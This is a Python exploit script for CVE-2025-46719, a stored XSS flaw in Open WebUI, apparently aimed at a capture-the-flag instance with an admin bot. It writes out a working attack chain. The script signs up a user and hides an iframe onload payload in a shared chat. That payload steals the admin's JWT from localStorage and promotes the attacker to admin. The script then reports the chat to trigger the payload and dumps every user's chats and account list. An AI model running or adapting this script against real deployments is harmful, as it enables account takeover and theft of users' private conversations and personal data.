#!/usr/bin/env python3
"""
CVE-2025-46719 - Open WebUI Stored XSS -> Admin Chat Exfiltration
Affects Open WebUI < 0.6.6

Attack flow:
1. Register user, get JWT token
2. Create chat with XSS payload in assistant message
3. Share the chat
4. Report the chat via /api/v1/utils/report -> admin bot visits it
5. XSS fires: promotes our user to admin via API
6. Use our now-admin token to read all chats -> flag
"""
import requests
import json
import time
import sys
import uuid
import html

BASE = "http://35.242.220.108:32189"

# ─── Step 1: Register / Login ───
print("[*] Step 1: Registering new user...")
s = requests.Session()

email = f"xss_{uuid.uuid4().hex[:8]}@test.com"
password = "Exploit1234!"
username = f"xss_{uuid.uuid4().hex[:6]}"

r = s.post(f"{BASE}/api/v1/auths/signup", json={
    "name": username,
    "email": email,
    "password": password
})

if r.status_code != 200:
    print(f"[-] Signup failed: {r.text[:200]}")
    print("[*] Trying login with test@test.com...")
    r = s.post(f"{BASE}/api/v1/auths/signin", json={
        "email": "test@test.com",
        "password": "Test1234!"
    })

user_data = r.json()
our_token = user_data.get("token", "")
our_user_id = user_data.get("id", "")
print(f"[+] Logged in as: {user_data.get('name')} (id: {our_user_id})")
print(f"[+] Role: {user_data.get('role')}")
print(f"[+] Token: {our_token[:60]}...")

headers = {
    "Authorization": f"Bearer {our_token}",
    "Content-Type": "application/json"
}

# ─── Step 2: Build XSS Payload ───
print("\n[*] Step 2: Building XSS payload...")

# The JS will run in admin's browser context.
# It grabs admin's JWT from localStorage and uses it to promote our user to admin.
js_code = (
    "var t=localStorage.getItem('token');"
    "if(t){"
    "fetch('/api/v1/users/" + our_user_id + "/role',{"
    "method:'POST',"
    "headers:{'Content-Type':'application/json','Authorization':'Bearer '+t},"
    "body:JSON.stringify({role:'admin'})"
    "});"
    "fetch('/api/v1/chats/new',{"
    "method:'POST',"
    "headers:{'Content-Type':'application/json','Authorization':'Bearer '+'" + our_token + "'},"
    "body:JSON.stringify({chat:{title:'STOLEN:'+t,messages:[]}})"
    "});"
    "}"
)

# CVE-2025-46719: iframe with src containing /api/v1/files/ rendered unsanitized
xss_html = '<iframe src="/api/v1/files/" onload="' + html.escape(js_code, quote=True) + '" style="display:none"></iframe>'

print(f"[+] XSS payload length: {len(xss_html)}")

# ─── Step 3: Create Chat with XSS ───
print("\n[*] Step 3: Creating chat with XSS payload...")

ts = int(time.time())
chat_data = {
    "chat": {
        "title": "Interesting AI conversation",
        "history": {
            "currentId": "msg2",
            "messages": {
                "msg1": {
                    "id": "msg1",
                    "parentId": None,
                    "childrenIds": ["msg2"],
                    "role": "user",
                    "content": "Hello, can you help me with something?",
                    "timestamp": ts
                },
                "msg2": {
                    "id": "msg2",
                    "parentId": "msg1",
                    "childrenIds": [],
                    "role": "assistant",
                    "content": xss_html,
                    "timestamp": ts
                }
            }
        },
        "messages": [
            {
                "id": "msg1",
                "parentId": None,
                "childrenIds": ["msg2"],
                "role": "user",
                "content": "Hello, can you help me with something?",
                "timestamp": ts
            },
            {
                "id": "msg2",
                "parentId": "msg1",
                "childrenIds": [],
                "role": "assistant",
                "content": xss_html,
                "timestamp": ts
            }
        ],
        "tags": [],
        "timestamp": ts
    }
}

r = s.post(f"{BASE}/api/v1/chats/new", headers=headers, json=chat_data)
print(f"[+] Chat creation: {r.status_code}")
if r.status_code != 200:
    print(f"[-] Response: {r.text[:500]}")
    sys.exit(1)

chat_response = r.json()
chat_id = chat_response.get("id", "")
print(f"[+] Chat ID: {chat_id}")

# ─── Step 4: Share the Chat ───
print("\n[*] Step 4: Sharing the chat...")
r = s.post(f"{BASE}/api/v1/chats/{chat_id}/share", headers=headers)
print(f"[+] Share response: {r.status_code}")
share_data = r.json()
share_id = share_data.get("share_id", share_data.get("id", chat_id))
share_url = f"{BASE}/s/{share_id}"
print(f"[+] Share URL: {share_url}")
print(f"[+] Share data: {json.dumps(share_data, indent=2)[:500]}")

# ─── Step 5: Report the Chat (triggers admin bot) ───
print("\n[*] Step 5: Reporting chat to trigger admin bot...")

r = s.post(f"{BASE}/api/v1/utils/report", headers=headers, json={"chat_id": chat_id})
print(f"[+] Report response: {r.status_code} -> {r.text[:500]}")

# ─── Step 6: Poll for Promotion / Stolen Token ───
print("\n[*] Step 6: Waiting for admin bot to trigger XSS...")
print(f"    Our user ID: {our_user_id}")
print(f"    Polling every 3s for up to 120s...")

for i in range(40):
    time.sleep(3)

    # Check if we got promoted to admin
    r_check = s.get(f"{BASE}/api/v1/auths/", headers=headers)
    my_info = r_check.json()
    current_role = my_info.get("role", "unknown")

    if current_role == "admin":
        print(f"\n[!!!] WE ARE NOW ADMIN! Role: {current_role}")

        # Get all chats from DB
        r_all = s.get(f"{BASE}/api/v1/chats/all/db", headers=headers)
        all_chats = r_all.json()
        print(f"[+] Total chats in DB: {len(all_chats) if isinstance(all_chats, list) else 'error'}")

        if isinstance(all_chats, list):
            for db_chat in all_chats:
                cid = db_chat.get("id", "")
                uid = db_chat.get("user_id", "")
                title = db_chat.get("title", "")
                if uid == our_user_id:
                    continue
                print(f"\n{'='*60}")
                print(f"[+] Chat: '{title}' (id: {cid}, user: {uid})")
                r5 = s.get(f"{BASE}/api/v1/chats/{cid}", headers=headers)
                full_chat = r5.json()
                chat_content = full_chat.get("chat", {})
                messages = chat_content.get("messages", [])
                for msg in messages:
                    role = msg.get("role", "")
                    content = msg.get("content", "")
                    print(f"  [{role}]: {content[:2000]}")

        # List all users
        print(f"\n{'='*60}")
        print("[+] All users:")
        r_users = s.get(f"{BASE}/api/v1/users/", headers=headers)
        if r_users.status_code == 200:
            for u in r_users.json():
                print(f"  {u.get('name')} ({u.get('email')}) role={u.get('role')} id={u.get('id')}")

        sys.exit(0)

    # Also check for stolen token in our chats
    r_chats = s.get(f"{BASE}/api/v1/chats/", headers=headers)
    chats = r_chats.json()
    for chat in chats:
        title = chat.get("title", "")
        if "STOLEN:" in title:
            admin_token = title.replace("STOLEN:", "").strip()
            print(f"\n[!!!] GOT ADMIN TOKEN from chat title!")
            print(f"[+] Token: {admin_token[:80]}...")

            admin_headers = {
                "Authorization": f"Bearer {admin_token}",
                "Content-Type": "application/json"
            }

            # Read admin's own chats
            r4 = s.get(f"{BASE}/api/v1/chats/", headers=admin_headers)
            admin_chats = r4.json()
            for ac in admin_chats:
                cid = ac.get("id", "")
                r5 = s.get(f"{BASE}/api/v1/chats/{cid}", headers=admin_headers)
                full = r5.json()
                print(f"\n[+] Admin Chat: '{full.get('title','')}'")
                for msg in full.get("chat", {}).get("messages", []):
                    print(f"  [{msg.get('role','')}]: {msg.get('content','')[:2000]}")

            # Also read all db chats
            r3 = s.get(f"{BASE}/api/v1/chats/all/db", headers=admin_headers)
            if r3.status_code == 200:
                for db_chat in r3.json():
                    cid = db_chat.get("id", "")
                    r5 = s.get(f"{BASE}/api/v1/chats/{cid}", headers=admin_headers)
                    full = r5.json()
                    print(f"\n[+] DB Chat: '{full.get('title','')}' user={db_chat.get('user_id','')}")
                    for msg in full.get("chat", {}).get("messages", []):
                        print(f"  [{msg.get('role','')}]: {msg.get('content','')[:2000]}")

            sys.exit(0)

    print(f"  [{i+1}/40] Waiting... (role: {current_role}, chats: {len(chats)})")

print("\n[-] Timeout reached. Admin didn't trigger XSS or payload failed.")
print("[*] Debug: Visit the share URL manually to verify XSS:")
print(f"    {share_url}")
